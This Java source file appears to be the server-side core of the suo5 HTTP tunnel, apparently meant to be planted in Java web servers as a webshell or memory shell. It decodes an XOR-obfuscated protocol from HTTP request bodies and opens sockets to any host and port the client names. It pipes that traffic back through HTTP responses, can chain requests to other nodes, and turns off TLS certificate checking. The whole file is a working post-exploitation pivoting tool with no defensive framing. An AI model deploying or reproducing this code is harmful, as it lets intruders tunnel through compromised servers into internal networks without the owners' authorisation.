package com.stdout.Models;

import com.stdout.Utils.Redefine.MyRequest;
import com.stdout.Utils.Redefine.MyResponse;
import com.stdout.Utils.Redefine.MyServletInputStream;
import com.stdout.Utils.Redefine.MyServletOutputStream;

import javax.net.ssl.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.*;
import java.nio.ByteBuffer;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import java.util.Enumeration;
import java.util.HashMap;

public class Suo5 implements Runnable, HostnameVerifier, X509TrustManager {

    public static HashMap addrs = collectAddr();
    public static HashMap ctx = new HashMap();

    InputStream gInStream;
    OutputStream gOutStream;

    public Suo5() {
    }

    public Suo5(InputStream in, OutputStream out) {
        this.gInStream = in;
        this.gOutStream = out;
    }


    public void process(Object sReq, Object sResp) throws Exception {
//        String agent = request.getHeader("User-Agent");
        String contentType = MyRequest.getHeader(sReq, "Content-Type");
//        String contentType = request.getHeader("Content-Type");
//
//        if (agent == null || !agent.equals("Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.1.2.3")) {
//            return;
//        }
//        if (contentType == null) {
//            return;
//        }

        try {
            if (contentType.equals("application/plain")) {
                tryFullDuplex(sReq, sResp);
                return;
            }

            if (contentType.equals("application/octet-stream")) {
                processDataBio(sReq, sResp);
            } else {
                processDataUnary(sReq, sResp);
            }
        } catch (Throwable e) {
//                System.out.printf("process data error %s\n", e);
//                e.printStackTrace();
        }

    }

    public void readFull(Object is, byte[] b) throws Exception {
        int bufferOffset = 0;
        while (bufferOffset < b.length) {
            int readLength = b.length - bufferOffset;
            int readResult = MyServletInputStream.read(is,b, bufferOffset, readLength);
//            int readResult = is.read(b, bufferOffset, readLength);
            if (readResult == -1) break;
            bufferOffset += readResult;
        }
    }

    public void tryFullDuplex(Object request, Object response) throws Exception {
        Object in = MyRequest.getInputStream(request);
//        InputStream in = request.getInputStream();
        byte[] data = new byte[32];
        readFull(in, data);
        Object out = MyResponse.getOutputStream(response);
//        OutputStream out = response.getOutputStream();
        MyServletOutputStream.write(out, data, 0, data.length);
//        out.write(data);
        MyServletOutputStream.flush(out);
//        out.flush();
    }


    private HashMap newCreate(byte s) {
        HashMap m = new HashMap();
        m.put("ac", new byte[]{0x04});
        m.put("s", new byte[]{s});
        return m;
    }

    private HashMap newData(byte[] data) {
        HashMap m = new HashMap();
        m.put("ac", new byte[]{0x01});
        m.put("dt", data);
        return m;
    }

    private HashMap newDel() {
        HashMap m = new HashMap();
        m.put("ac", new byte[]{0x02});
        return m;
    }

    private HashMap newStatus(byte b) {
        HashMap m = new HashMap();
        m.put("s", new byte[]{b});
        return m;
    }

    byte[] u32toBytes(int i) {
        byte[] result = new byte[4];
        result[0] = (byte) (i >> 24);
        result[1] = (byte) (i >> 16);
        result[2] = (byte) (i >> 8);
        result[3] = (byte) (i /*>> 0*/);
        return result;
    }

    int bytesToU32(byte[] bytes) {
        return ((bytes[0] & 0xFF) << 24) |
                ((bytes[1] & 0xFF) << 16) |
                ((bytes[2] & 0xFF) << 8) |
                ((bytes[3] & 0xFF) << 0);
    }

    synchronized void put(String k, Object v) {
        ctx.put(k, v);
    }

    synchronized Object get(String k) {
        return ctx.get(k);
    }

    synchronized Object remove(String k) {
        return ctx.remove(k);
    }

    byte[] copyOfRange(byte[] original, int from, int to) {
        int newLength = to - from;
        if (newLength < 0) {
            throw new IllegalArgumentException(from + " > " + to);
        }
        byte[] copy = new byte[newLength];
        int copyLength = Math.min(original.length - from, newLength);
        // can't use System.arraycopy of Arrays.copyOf, there is no system in some environment
        // System.arraycopy(original, from, copy, 0,  copyLength);
        for (int i = 0; i < copyLength; i++) {
            copy[i] = original[from + i];
        }
        return copy;
    }


    private byte[] marshal(HashMap m) throws Exception {
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        Object[] keys = m.keySet().toArray();
        for (int i = 0; i < keys.length; i++) {
            String key = (String) keys[i];
            byte[] value = (byte[]) m.get(key);
            buf.write((byte) key.length());
            buf.write(key.getBytes());
            buf.write(u32toBytes(value.length));
            buf.write(value);
        }

        byte[] data = buf.toByteArray();
        ByteBuffer dbuf = ByteBuffer.allocate(5 + data.length);
        dbuf.putInt(data.length);
        // xor key
        byte key = data[data.length / 2];
        dbuf.put(key);
        for (int i = 0; i < data.length; i++) {
            data[i] = (byte) (data[i] ^ key);
        }
        dbuf.put(data);
        return dbuf.array();
    }

    private HashMap unmarshal(Object in) throws Exception {
        byte[] header = new byte[4 + 1]; // size and datatype
        readFull(in, header);
        // read full
        ByteBuffer bb = ByteBuffer.wrap(header);
        int len = bb.getInt();
        int x = bb.get();
        if (len > 1024 * 1024 * 32) {
            throw new Exception("invalid len");
        }
        byte[] bs = new byte[len];
        readFull(in, bs);
        for (int i = 0; i < bs.length; i++) {
            bs[i] = (byte) (bs[i] ^ x);
        }
        HashMap m = new HashMap();
        byte[] buf;
        for (int i = 0; i < bs.length - 1; ) {
            short kLen = bs[i];
            i += 1;
            if (i + kLen >= bs.length) {
                throw new Exception("key len error");
            }
            if (kLen < 0) {
                throw new Exception("key len error");
            }
            buf = copyOfRange(bs, i, i + kLen);
            String key = new String(buf);
            i += kLen;

            if (i + 4 >= bs.length) {
                throw new Exception("value len error");
            }
            buf = copyOfRange(bs, i, i + 4);
            int vLen = bytesToU32(buf);
            i += 4;
            if (vLen < 0) {
                throw new Exception("value error");
            }

            if (i + vLen > bs.length) {
                throw new Exception("value error");
            }
            byte[] value = copyOfRange(bs, i, i + vLen);
            i += vLen;

            m.put(key, value);
        }
        return m;
    }

    private void processDataBio(Object request, Object resp) throws Exception {
        Object reqInputStream = MyRequest.getInputStream(request);
//        final InputStream reqInputStream = request.getInputStream();
        HashMap dataMap = unmarshal(reqInputStream);

        byte[] action = (byte[]) dataMap.get("ac");
        if (action.length != 1 || action[0] != 0x00) {
            MyResponse.setStatus(resp, 403);
            return;
        }
        MyResponse.setBufferSize(resp, 512);
//        resp.setBufferSize(512);
        Object respOutStream = MyResponse.getOutputStream(resp);
//        final OutputStream respOutStream = resp.getOutputStream();

        // 0x00 create socket
        MyResponse.setHeader(resp, "X-Accel-Buffering", "no");
//        resp.setHeader("X-Accel-Buffering", "no");
        Socket sc;
        try {
            String host = new String((byte[]) dataMap.get("h"));
            int port = Integer.parseInt(new String((byte[]) dataMap.get("p")));
            if (port == 0) {
                try {
                    // Cannot convert Integer to int
                    port = ((Integer) request.getClass().getMethod("getLocalPort", new Class[]{}).invoke(request, new Object[]{})).intValue();
                } catch (Exception e) {
                    port = ((Integer) request.getClass().getMethod("getServerPort", new Class[]{}).invoke(request, new Object[]{})).intValue();
                }
            }
            sc = new Socket();
            sc.connect(new InetSocketAddress(host, port), 5000);
        } catch (Exception e) {
            byte[] data = marshal(newStatus((byte) 0x01));
            MyServletOutputStream.write(respOutStream, data, 0, data.length);
//            respOutStream.write(marshal(newStatus((byte) 0x01)));
            MyServletOutputStream.flush(respOutStream);
//            respOutStream.flush();
            MyServletOutputStream.close(respOutStream);
//            respOutStream.close();
            return;
        }

        byte[] data = marshal(newStatus((byte) 0x00));
        MyServletOutputStream.write(respOutStream, data, 0, data.length);
        MyServletOutputStream.flush(respOutStream);
//        respOutStream.write(marshal(newStatus((byte) 0x00)));
//        respOutStream.flush();
        MyResponse.flushBuffer(resp);
//        resp.flushBuffer();

        OutputStream scOutStream = sc.getOutputStream();
        InputStream scInStream = sc.getInputStream();

        Thread t = null;
        try {
            Suo5 p = new Suo5(scInStream, (OutputStream) respOutStream);
            t = new Thread(p);
            t.start();
            readReq(reqInputStream, scOutStream);
        } catch (Exception e) {
//                System.out.printf("pipe error, %s\n", e);
//                e.printStackTrace();
        } finally {
            sc.close();
            MyServletOutputStream.close(respOutStream);
//            respOutStream.close();
            if (t != null) {
                t.join();
            }
        }
    }

    private void readSocket(InputStream inputStream, OutputStream outputStream, boolean needMarshal) throws Exception {
        byte[] readBuf = new byte[1024 * 8];
        while (true) {
//            int n = MyServletInputStream.read(inputStream, readBuf, 0, readBuf.length);
            int n = inputStream.read(readBuf);
            if (n <= 0) {
                break;
            }
            byte[] dataTmp = copyOfRange(readBuf, 0, 0 + n);
            if (needMarshal) {
                dataTmp = marshal(newData(dataTmp));
            }
//            MyServletOutputStream.write(outputStream, dataTmp, 0, dataTmp.length);
            outputStream.write(dataTmp);
//            MyServletOutputStream.flush(outputStream);
            outputStream.flush();
        }
    }

    private void readReq(Object bufInputStream, Object socketOutStream) throws Exception {
        while (true) {
            HashMap dataMap;
            dataMap = unmarshal(bufInputStream);

            byte[] actions = (byte[]) dataMap.get("ac");
            if (actions.length != 1) {
                return;
            }
            byte action = actions[0];
            if (action == 0x02) {
                MyServletOutputStream.close(socketOutStream);
//                socketOutStream.close();
                return;
            } else if (action == 0x01) {
                byte[] data = (byte[]) dataMap.get("dt");
                if (data.length != 0) {
                    MyServletOutputStream.write(socketOutStream, data, 0, data.length);
//                    socketOutStream.write(data);
                    MyServletOutputStream.flush(socketOutStream);
//                    socketOutStream.flush();
                }
            } else if (action == 0x03) {
                continue;
            } else {
                return;
            }
        }
    }

    private void processDataUnary(Object request, Object resp) throws
            Exception {
//        Object is = MyRequest.getInputStream(request);
        InputStream is = (InputStream) MyRequest.getInputStream(request);
        BufferedInputStream reader = new BufferedInputStream(is);
        HashMap dataMap;
        dataMap = unmarshal(reader);


        String clientId = new String((byte[]) dataMap.get("id"));
        byte[] actions = (byte[]) dataMap.get("ac");
        if (actions.length != 1) {
            MyResponse.setStatus(resp, 403);
//            resp.setStatus(403);
            return;
        }
        /*
            ActionCreate    byte = 0x00
            ActionData      byte = 0x01
            ActionDelete    byte = 0x02
            ActionHeartbeat byte = 0x03
         */
        byte action = actions[0];
        byte[] redirectData = (byte[]) dataMap.get("r");
        boolean needRedirect = redirectData != null && redirectData.length > 0;
        String redirectUrl = "";
        if (needRedirect) {
            dataMap.remove("r");
            redirectUrl = new String(redirectData);
            needRedirect = !isLocalAddr(redirectUrl);
        }
        // load balance, send request with data to request url
        // action 0x00 need to pipe, see below
        if (needRedirect && action >= 0x01 && action <= 0x03) {
            HttpURLConnection conn = redirect(request, dataMap, redirectUrl);
            conn.disconnect();
            return;
        }

        MyResponse.setBufferSize(resp, 512);
//        resp.setBufferSize(512);
        Object respOutStream = MyResponse.getOutputStream(resp);
//        OutputStream respOutStream = resp.getOutputStream();
        if (action == 0x02) {
            Object o = this.get(clientId);
            if (o == null) return;
            OutputStream scOutStream = (OutputStream) o;
            scOutStream.close();
            return;
        } else if (action == 0x01) {
            Object o = this.get(clientId);
            if (o == null) {
                byte[] data = marshal(newDel());
                MyServletOutputStream.write(respOutStream, data, 0, data.length);
//                respOutStream.write(marshal(newDel()));
                MyServletOutputStream.flush(respOutStream);
//                respOutStream.flush();
                MyServletOutputStream.close(respOutStream);
//                respOutStream.close();
                return;
            }
            OutputStream scOutStream = (OutputStream) o;
            byte[] data = (byte[]) dataMap.get("dt");
            if (data.length != 0) {
                scOutStream.write(data);
                scOutStream.flush();
            }
            MyServletOutputStream.close(respOutStream);
//            respOutStream.close();
            return;
        } else {
        }

        if (action != 0x00) {
            return;
        }
        // 0x00 create new tunnel
        MyResponse.setHeader(resp, "X-Accel-Buffering", "no");
//        resp.setHeader("X-Accel-Buffering", "no");
        String host = new String((byte[]) dataMap.get("h"));
        int port = Integer.parseInt(new String((byte[]) dataMap.get("p")));
        if (port == 0) {
            try {
                port = ((Integer) request.getClass().getMethod("getLocalPort", new Class[]{}).invoke(request, new Object[]{})).intValue();
            } catch (Exception e) {
                port = ((Integer) request.getClass().getMethod("getServerPort", new Class[]{}).invoke(request, new Object[]{})).intValue();
            }
        }

        InputStream readFrom;
        Socket sc = null;
        HttpURLConnection conn = null;

        if (needRedirect) {
            // pipe redirect stream and current response body
            conn = redirect(request, dataMap, redirectUrl);
            readFrom = conn.getInputStream();
        } else {
            // pipe socket stream and current response body
            try {
                sc = new Socket();
                sc.connect(new InetSocketAddress(host, port), 5000);
                readFrom = sc.getInputStream();
                this.put(clientId, sc.getOutputStream());

                byte[] data = marshal(newStatus((byte) 0x00));
                MyServletOutputStream.write(respOutStream, data, 0, data.length);
                MyServletOutputStream.flush(respOutStream);
//                respOutStream.write(marshal(newStatus((byte) 0x00)));
//                respOutStream.flush();
                MyResponse.flushBuffer(resp);
//                resp.flushBuffer();
            } catch (Exception e) {
//                    System.out.printf("connect error %s\n", e);
//                    e.printStackTrace();
                this.remove(clientId);
                byte[] data = marshal(newStatus((byte) 0x01));
                MyServletOutputStream.write(respOutStream, data, 0, data.length);
                MyServletOutputStream.flush(respOutStream);
//                respOutStream.write(marshal(newStatus((byte) 0x01)));
//                respOutStream.flush();
                MyServletOutputStream.close(respOutStream);
//                respOutStream.close();
                return;
            }
        }
        try {
            readSocket(readFrom, (OutputStream) respOutStream, !needRedirect);
        } catch (Exception e) {
//                System.out.println("socket error " + e.toString());
//                e.printStackTrace();
        } finally {
            if (sc != null) {
                sc.close();
            }
            if (conn != null) {
                conn.disconnect();
            }
            MyServletOutputStream.close(respOutStream);
//            respOutStream.close();
            this.remove(clientId);
        }
    }

    public void run() {
        try {
            readSocket(this.gInStream, this.gOutStream, true);
        } catch (Exception e) {
//                System.out.printf("read socket error, %s\n", e);
//                e.printStackTrace();
        }
    }

    static HashMap collectAddr() {
        HashMap addrs = new HashMap();
        try {
            Enumeration nifs = NetworkInterface.getNetworkInterfaces();
            while (nifs.hasMoreElements()) {
                NetworkInterface nif = (NetworkInterface) nifs.nextElement();
                Enumeration addresses = nif.getInetAddresses();
                while (addresses.hasMoreElements()) {
                    InetAddress addr = (InetAddress) addresses.nextElement();
                    String s = addr.getHostAddress();
                    if (s != null) {
                        // fe80:0:0:0:fb0d:5776:2d7c:da24%wlan4  strip %wlan4
                        int ifaceIndex = s.indexOf('%');
                        if (ifaceIndex != -1) {
                            s = s.substring(0, ifaceIndex);
                        }
                        addrs.put((Object) s, (Object) Boolean.TRUE);
                    }
                }
            }
        } catch (Exception e) {
//                System.out.printf("read socket error, %s\n", e);
//                e.printStackTrace();
        }
        return addrs;
    }

    boolean isLocalAddr(String url) throws Exception {
        String ip = (new URL(url)).getHost();
        return addrs.containsKey(ip);
    }

    HttpURLConnection redirect(Object request, HashMap dataMap, String rUrl) throws Exception {
        String method = MyRequest.getMethod(request);
//        String method = request.getMethod();
        URL u = new URL(rUrl);
        HttpURLConnection conn = (HttpURLConnection) u.openConnection();
        conn.setRequestMethod(method);
        try {
            // conn.setConnectTimeout(3000);
            conn.getClass().getMethod("setConnectTimeout", new Class[]{int.class}).invoke(conn, new Object[]{new Integer(3000)});
            // conn.setReadTimeout(0);
            conn.getClass().getMethod("setReadTimeout", new Class[]{int.class}).invoke(conn, new Object[]{new Integer(0)});
        } catch (Exception e) {
            // java1.4
        }
        conn.setDoOutput(true);
        conn.setDoInput(true);

        // ignore ssl verify
        // ref: https://github.com/L-codes/Neo-reGeorg/blob/master/templates/NeoreGeorg.java
        if (HttpsURLConnection.class.isInstance(conn)) {
            ((HttpsURLConnection) conn).setHostnameVerifier(this);
            SSLContext sslCtx = SSLContext.getInstance("SSL");
            sslCtx.init(null, new TrustManager[]{this}, null);
            ((HttpsURLConnection) conn).setSSLSocketFactory(sslCtx.getSocketFactory());
        }

        Enumeration headers = MyRequest.getHeaderNames(request);
//        Enumeration headers = request.getHeaderNames();
        while (headers.hasMoreElements()) {
            String k = (String) headers.nextElement();
            conn.setRequestProperty(k, MyRequest.getHeader(request, k));
//            conn.setRequestProperty(k, request.getHeader(k));
        }

        OutputStream rout = conn.getOutputStream();
        rout.write(marshal(dataMap));
        rout.flush();
        rout.close();
        conn.getResponseCode();
        return conn;
    }

    public boolean verify(String hostname, SSLSession session) {
        return true;
    }

    public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {
    }

    public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException {
    }

    public X509Certificate[] getAcceptedIssuers() {
        return new X509Certificate[0];
    }
}
